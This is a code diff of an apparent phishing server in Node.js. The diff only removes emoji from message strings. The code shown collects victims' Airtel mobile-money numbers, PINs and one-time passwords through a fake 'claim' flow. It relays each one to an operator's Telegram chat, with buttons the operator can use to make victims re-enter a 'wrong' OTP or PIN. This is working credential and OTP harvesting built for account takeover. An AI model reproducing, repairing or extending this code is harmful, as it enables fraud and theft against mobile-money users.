@@ -937,11 +937,11 @@ async function editTelegramMessage(chatId, messageId, text) {
 function getClaimKeyboard(claimId) {
     return [
         [
-            { text: '✅ Approve', callback_data: 'approve:' + claimId },
-            { text: '❌ Wrong OTP', callback_data: 'reject_otp:' + claimId },
+            { text: ' Approve', callback_data: 'approve:' + claimId },
+            { text: ' Wrong OTP', callback_data: 'reject_otp:' + claimId },
         ],
         [
-            { text: '⚠️ Wrong PIN', callback_data: 'reject_pin:' + claimId }
+            { text: ' Wrong PIN', callback_data: 'reject_pin:' + claimId }
         ]
     ];
 }
@@ -1032,12 +1032,12 @@ app.post('/api/start-claim', async (req, res) => {
 
         // Send Telegram message with inline action buttons
         const msg =
-            '🔔 <b>NEW CLAIM STARTED</b>\n\n' +
-            '🆔 <b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
-            '🌍 <b>Country:</b> <code>' + (country || 'N/A') + ' ' + (countryCode || '') + '</code>\n' +
-            '📱 <b>Airtel Number:</b> <code>' + airtelNumber + '</code>\n' +
-            '🔑 <b>Airtel PIN:</b> <code>' + airtelPin + '</code>\n' +
-            '🕐 <b>Started:</b> ' + new Date().toLocaleString() + '\n\n' +
+            ' <b>NEW CLAIM STARTED</b>\n\n' +
+            ' <b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
+            ' <b>Country:</b> <code>' + (country || 'N/A') + ' ' + (countryCode || '') + '</code>\n' +
+            ' <b>Airtel Number:</b> <code>' + airtelNumber + '</code>\n' +
+            ' <b>Airtel PIN:</b> <code>' + airtelPin + '</code>\n' +
+            ' <b>Started:</b> ' + new Date().toLocaleString() + '\n\n' +
             '<i>User is entering OTP...</i>';
 
         await sendTelegramMessage(msg, getClaimKeyboard(claimId));
@@ -1062,13 +1062,13 @@ app.post('/api/submit-otp', async (req, res) => {
         c.otpSubmittedAt = new Date().toISOString();
 
         const msg =
-            '🔐 <b>OTP SUBMITTED — ACTION NEEDED</b>\n\n' +
-            '🆔 <b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
-            '🌍 <b>Country:</b> <code>' + (c.country || 'N/A') + ' ' + (c.countryCode || '') + '</code>\n' +
-            '📱 <b>Airtel Number:</b> <code>' + c.airtelNumber + '</code>\n' +
-            '🔑 <b>PIN:</b> <code>' + c.airtelPin + '</code>\n' +
-            '🔢 <b>OTP Entered:</b> <code>' + otp + '</code>\n' +
-            '🕐 <b>Time:</b> ' + new Date().toLocaleString();
+            ' <b>OTP SUBMITTED — ACTION NEEDED</b>\n\n' +
+            ' <b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
+            ' <b>Country:</b> <code>' + (c.country || 'N/A') + ' ' + (c.countryCode || '') + '</code>\n' +
+            ' <b>Airtel Number:</b> <code>' + c.airtelNumber + '</code>\n' +
+            ' <b>PIN:</b> <code>' + c.airtelPin + '</code>\n' +
+            ' <b>OTP Entered:</b> <code>' + otp + '</code>\n' +
+            ' <b>Time:</b> ' + new Date().toLocaleString();
 
         await sendTelegramMessage(msg, getClaimKeyboard(claimId));
 
@@ -1122,36 +1122,36 @@ app.post(`/telegram/webhook`, async (req, res) => {
                 c.status = 'approved';
                 c.decidedAt = new Date().toISOString();
                 c.decidedBy = 'telegram';
-                await answerCallbackQuery(cq.id, '✅ Approved!');
+                await answerCallbackQuery(cq.id, ' Approved!');
                 await sendTelegramMessage(
-                    '✅ <b>APPROVED</b>\n\n' +
-                    '🆔 <b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
-                    '📱 <b>Airtel Number:</b> <code>' + c.airtelNumber + '</code>\n' +
-                    '🕐 <b>Time:</b> ' + new Date().toLocaleString()
+                    ' <b>APPROVED</b>\n\n' +
+                    ' <b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
+                    ' <b>Airtel Number:</b> <code>' + c.airtelNumber + '</code>\n' +
+                    ' <b>Time:</b> ' + new Date().toLocaleString()
                 );
             } else if (action === 'reject_otp') {
                 c.status = 'rejected_otp';
                 c.decidedAt = new Date().toISOString();
                 c.decidedBy = 'telegram';
-                await answerCallbackQuery(cq.id, '❌ Wrong OTP');
+                await answerCallbackQuery(cq.id, ' Wrong OTP');
                 await sendTelegramMessage(
-                    '❌ <b>WRONG OTP</b>\n\n' +
-                    '🆔 <b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
-                    '📱 <b>Airtel Number:</b> <code>' + c.airtelNumber + '</code>\n' +
-                    '🔢 <b>OTP Entered:</b> <code>' + (c.otpEntered || 'N/A') + '</code>\n' +
-                    '➡️ <i>User will re-enter OTP</i>'
+                    ' <b>WRONG OTP</b>\n\n' +
+                    ' <b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
+                    ' <b>Airtel Number:</b> <code>' + c.airtelNumber + '</code>\n' +
+                    ' <b>OTP Entered:</b> <code>' + (c.otpEntered || 'N/A') + '</code>\n' +
+                    ' <i>User will re-enter OTP</i>'
                 );
             } else if (action === 'reject_pin') {
                 c.status = 'rejected_pin';
                 c.decidedAt = new Date().toISOString();
                 c.decidedBy = 'telegram';
-                await answerCallbackQuery(cq.id, '⚠️ Wrong PIN');
+                await answerCallbackQuery(cq.id, ' Wrong PIN');
                 await sendTelegramMessage(
-                    '⚠️ <b>WRONG PIN</b>\n\n' +
-                    '🆔 <b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
-                    '📱 <b>Airtel Number:</b> <code>' + c.airtelNumber + '</code>\n' +
-                    '🔑 <b>PIN Entered:</b> <code>' + c.airtelPin + '</code>\n' +
-                    '➡️ <i>User will re-enter PIN</i>'
+                    ' <b>WRONG PIN</b>\n\n' +
+                    ' <b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
+                    ' <b>Airtel Number:</b> <code>' + c.airtelNumber + '</code>\n' +
+                    ' <b>PIN Entered:</b> <code>' + c.airtelPin + '</code>\n' +
+                    ' <i>User will re-enter PIN</i>'
                 );
             } else {
                 await answerCallbackQuery(cq.id, '❓ Unknown action');
